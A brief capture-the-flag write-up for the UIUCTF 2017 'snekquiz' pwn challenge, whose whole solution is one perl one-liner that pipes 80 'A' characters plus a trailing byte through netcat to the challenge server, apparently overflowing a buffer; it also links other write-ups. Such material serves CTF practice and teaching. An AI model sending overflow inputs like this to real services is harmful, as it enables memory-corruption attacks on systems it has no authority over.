# UIUCTF-2017 : snekquiz

**Category:** pwn
**Points:** 200
**Solves:** 
**Description:**

> 200 Points ¡ñ pwn
>
> By: JP Smith
>
> challenge.uiuc.tf 11343
>
> test ur noledge

## Write-up

perl -e "print \"A\" x 80 . \"\0x5\";" | nc challenge.uiuc.tf 11343

## Other write-ups and resources
* [New_Damotorie](https://gist.github.com/parksjin01/89d6bc25d4bb8c9701e78bb26647f996)
* [Umbra](https://github.com/sikula/ctf_writeups_2017/blob/master/UIUCTF/snekquiz/snekquiz.md)
